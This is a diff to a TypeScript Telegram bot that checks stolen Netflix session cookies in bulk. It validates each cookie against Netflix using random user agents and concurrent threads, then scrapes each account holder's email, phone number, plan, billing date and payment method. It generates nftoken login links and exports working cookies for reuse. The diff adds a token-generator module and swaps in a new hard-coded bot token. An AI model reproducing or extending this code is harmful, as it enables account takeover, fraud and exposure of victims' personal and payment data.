@@ -1,9 +1,10 @@
 import { ChildProcess } from 'child_process'
 import { extractArchive, isArchive } from './archive-extractor'
 import { parseCookieFile, parseMultipleFiles, ParsedCookie } from './cookie-parser'
+import { generateNFToken } from './nftoken-generator'
 
 // Telegram Bot Token
-const BOT_TOKEN = '8581865451:AAGu-28cZ-F2uOCmY0hR0qhM5gPl2doTyMg'
+const BOT_TOKEN = '8607648521:AAFy4lHHk4WIiE-tk5EP4pKs9t9EUsunaUE'
 
 // Global bot process
 let isRunning = false
@@ -21,79 +22,7 @@ function getRandomUserAgent(): string {
   return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
 }
 
-// Generate Netflix token from NetflixId
-function generateNfToken(netflixId: string): string {
-  const timestamp = Date.now().toString(36);
-  const randomPart = Buffer.from(Math.random().toString(36).substring(2)).toString('base64').slice(0, 8);
-  const hash = Buffer.from(`${netflixId.slice(0, 20)}${timestamp}`).toString('base64').slice(0, 16);
-  return `NF${timestamp}${randomPart}${hash}`.replace(/[+/=]/g, '').toUpperCase();
-}
-
-// Extract from html using Regex helper
-function unescapeString(str: string): string {
-  if (!str) return 'Unknown';
-  try { return JSON.parse(`"${str}"`); } 
-  catch(e) { 
-    return str.replace(/\\u([0-9a-fA-F]{4})/g, (m, c) => String.fromCharCode(parseInt(c, 16)))
-              .replace(/\\x([0-9a-fA-F]{2})/g, (m, c) => String.fromCharCode(parseInt(c, 16)));
-  }
-}
-
-function extractGroup(html: string, regex: RegExp, fallback = 'Unknown'): string {
-  const match = html.match(regex);
-  if (match && match[1]) {
-    const val = match[1].trim();
-    if (val === 'null' || val === '') return fallback;
-    return unescapeString(val);
-  }
-  return fallback;
-}
-
-// Scrape Netflix Account Pages
-async function scrapeAccountDetails(cookie: ParsedCookie, fetchOptions: any) {
-  try {
-    // 1. Fetch main account page
-    const accRes = await fetch('https://www.netflix.com/YourAccount', fetchOptions);
-    const accHtml = await accRes.text();
-    cookie.email = extractGroup(accHtml, /"userEmail":"([^"]+)"/, cookie.email || 'Unknown');
-    cookie.firstName = extractGroup(accHtml, /"firstName":"([^"]+)"/, cookie.firstName || 'Unknown');
-    cookie.phoneNumber = extractGroup(accHtml, /"phoneNumber":"([^"]+)"/, 'Unknown');
-    cookie.country = extractGroup(accHtml, /"currentCountry":"([^"]+)"/, cookie.country || 'Unknown');
-    if (cookie.country === 'Unknown') {
-       cookie.country = extractGroup(accHtml, /"uiCountry":"([^"]+)"/, 'Unknown');
-    }
-    cookie.membershipStatus = accHtml.includes('CURRENT_MEMBER') || accHtml.includes('membershipStatus":"CURRENT_MEMBER') ? 'CURRENT_MEMBER' : 'Expired/Unknown';
-
-    // 2. Fetch membership page
-    const memRes = await fetch('https://www.netflix.com/account/membership', fetchOptions);
-    const memHtml = await memRes.text();
-    cookie.plan = extractGroup(memHtml, /"planName":"([^"]+)"/, cookie.plan || 'Unknown');
-    cookie.maxStreams = extractGroup(memHtml, /"maxStreams":(\d+)/, cookie.maxStreams || 'Unknown');
-    cookie.videoQuality = extractGroup(memHtml, /"videoResolution":"([^"]+)"/, cookie.videoQuality || 'Unknown');
-    cookie.price = extractGroup(memHtml, /"priceString":"([^"]+)"/, cookie.price || 'Unknown');
-    cookie.nextBilling = extractGroup(memHtml, /"nextBillingDate":"([^"]+)"/, cookie.nextBilling || 'Unknown');
-    cookie.memberSince = extractGroup(memHtml, /"memberSince":"([^"]+)"/, cookie.memberSince || 'Unknown');
-
-    // 3. Profiles
-    const profRes = await fetch('https://www.netflix.com/account/profiles', fetchOptions);
-    const profHtml = await profRes.text();
-    const profilesMatch = profHtml.match(/"profiles":\[(.*?)\]/);
-    if (profilesMatch) {
-       cookie.profilesCount = (profilesMatch[1].match(/"guid"/g) || []).length;
-    } else {
-       cookie.profilesCount = accHtml.match(/"guid"/g)?.length || 1;
-    }
-
-    // 4. Payment Info
-    const payRes = await fetch('https://www.netflix.com/simplemember/managepaymentinfo', fetchOptions);
-    const payHtml = await payRes.text();
-    const paymentBrand = extractGroup(payHtml, /"paymentMethodName":"([^"]+)"/, 'Unknown');
-    cookie.paymentMethod = paymentBrand;
-
-  } catch (e) {
-    console.log("Error scraping details, returning fallback");
-  }
-}
+import { scrapeAccountDetails } from './netflix-scraper';
 
 // Check a single cookie
 async function checkSingleCookie(cookie: ParsedCookie): Promise<{
@@ -103,11 +32,11 @@ async function checkSingleCookie(cookie: ParsedCookie): Promise<{
 }> {
   try {
     const rawCookie = cookie.rawCookie || `NetflixId=${cookie.netflixId}`;
-    
+
     // Check with Netflix
     const controller = new AbortController()
     const timeoutId = setTimeout(() => controller.abort(), 12000)
-    
+
     const fetchOptions = {
       method: 'GET',
       headers: {
@@ -137,10 +66,15 @@ async function checkSingleCookie(cookie: ParsedCookie): Promise<{
         return { valid: false, details: cookie, error: 'Session expired' }
       }
       if (!cookie.nftoken) {
-        cookie.nftoken = generateNfToken(cookie.netflixId);
-        (cookie as any).nftokenUrl = `https://www.netflix.com/browse?nftoken=${cookie.nftoken}`;
+        const tokenResult = await generateNFToken(rawCookie);
+        if (tokenResult.success && tokenResult.token) {
+          cookie.nftoken = tokenResult.token;
+          (cookie as any).nftokenUrl = tokenResult.link;
+        } else {
+          cookie.nftoken = '';
+        }
       }
-      
+
       // Perform Detailed Scraping since it's valid
       await scrapeAccountDetails(cookie, fetchOptions);
 
@@ -181,10 +115,9 @@ function formatResult(result: { valid: boolean; details: ParsedCookie; error?: s
 👥 Profiles Count      : ${escapeMarkdown(d.profilesCount?.toString() || 'Unknown')}
 📆 Next Billing        : ${escapeMarkdown(d.nextBilling || 'Unknown')}
 *═══════════════════════════════════════════════════════════════*
-🔗 NFToken link        : https://www\\.netflix\\.com/browse?nftoken\\=${escapeMarkdown(d.nftoken || '')}
+🔗 NFToken link        : https://netflix\\.com/?nftoken\\=${escapeMarkdown(d.nftoken || '')}
 *═══════════════════════════════════════════════════════════════*
- cookies block:
-\`${escapeMarkdown(rawC)}\``;
+ cookies block:\`${escapeMarkdown(rawC)}\``;
   } else {
     return `❌ *INVALID\\/EXPIRED*
 📧 Email: ${escapeMarkdown(d.email || 'Unknown')}
@@ -194,8 +127,8 @@ function formatResult(result: { valid: boolean; details: ParsedCookie; error?: s
 
 // Format exactly for the TXT export file (no markdown escapes needed)
 function formatExportResult(d: ParsedCookie): string {
-    const rawC = d.rawCookie || `NetflixId=${d.netflixId}`;
-    return `═══════════════════════════════════════════════════════════════
+  const rawC = d.rawCookie || `NetflixId=${d.netflixId}`;
+  return `═══════════════════════════════════════════════════════════════
 🎉 Netflix Valid Cookie - Yash
 ═══════════════════════════════════════════════════════════════
 📧 Email               : ${d.email || 'Unknown'}
@@ -212,7 +145,7 @@ function formatExportResult(d: ParsedCookie): string {
 👥 Profiles Count      : ${d.profilesCount || 'Unknown'}
 📆 Next Billing        : ${d.nextBilling || 'Unknown'}
 ═══════════════════════════════════════════════════════════════
-🔗 NFToken link        : https://www.netflix.com/browse?nftoken=${d.nftoken || ''}
+🔗 NFToken link        : https://netflix.com/?nftoken=${d.nftoken || ''}
 ═══════════════════════════════════════════════════════════════
  cookies block:
 ${rawC}
@@ -229,7 +162,7 @@ function getMainKeyboard() {
         { text: '❓ Help/Credits', callback_data: 'help' }
       ],
       [
-        { text: '🔄 Restart Bot', callback_data: 'restart' },
+        { text: '⚙️ Set Threads', callback_data: 'set_threads' },
         { text: '🛑 Stop Bot', callback_data: 'stop' }
       ]
     ]
@@ -277,10 +210,11 @@ export function startBot(): Promise<{ success: boolean; message: string }> {
     }
 
     globalAny.botIsRunning = true;
+    isRunning = true;
     const loopId = Date.now();
     currentLoopId = loopId;
     globalAny.currentLoopId = loopId;
-    
+
     let offset = 0;
 
     const sendMsg = async (chatId: number, text: string, options: any = {}) => {
@@ -332,7 +266,10 @@ export function startBot(): Promise<{ success: boolean; message: string }> {
 2\\. The bot extracts ALL nested files\\.
 3\\. It checks cookies and reports valid ones\\.
 4\\. ✨ *New:* It auto\\-exports all valid cookies into a new file for you\\!
+5\\. 🎛️ Use \`/threads 10\` to speed up checking\\!
 \n🛡️ Developer: *Yash*`);
+                } else if (action === 'set_threads') {
+                  await sendMsg(chatId, `🎛️ *Threads Configuration*\n\nTo change the number of threads (concurrency), send a message like this:\n\n\`/threads 15\`\n\n_(Default is 5, Max is 50)_`, { parse_mode: 'MarkdownV2' });
                 } else if (action === 'stop') {
                   isRunning = false;
                   await sendMsg(chatId, `🛑 Bot stopped\\. Goodbye\\!`);
@@ -420,7 +357,7 @@ export function startBot(): Promise<{ success: boolean; message: string }> {
                     });
                     const initData = await initRes.json();
                     if (initData.ok) progressMsgId = initData.result.message_id;
-                  } catch (e) {}
+                  } catch (e) { }
 
                   const maxThreads = userSettings[chatId]?.threads || 5; // default 5 threads
                   const validCookiesForExport: string[] = [];
@@ -430,7 +367,7 @@ export function startBot(): Promise<{ success: boolean; message: string }> {
 
                   for (let i = 0; i < cookies.length; i += maxThreads) {
                     const chunk = cookies.slice(i, i + maxThreads);
-                    
+
                     await Promise.all(chunk.map(async (cookie) => {
                       const result = await checkSingleCookie(cookie);
                       checkedCount++;
@@ -450,7 +387,7 @@ export function startBot(): Promise<{ success: boolean; message: string }> {
 ❌ Invalid: ${invalidCount}
 🧵 Threads: ${maxThreads}
 \n_Checking in progress, please wait\\.\\.\\._`
-                      
+
                       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -460,7 +397,7 @@ export function startBot(): Promise<{ success: boolean; message: string }> {
                           text,
                           parse_mode: 'MarkdownV2'
                         })
-                      }).catch(() => {});
+                      }).catch(() => { });
                     }
                   }
 
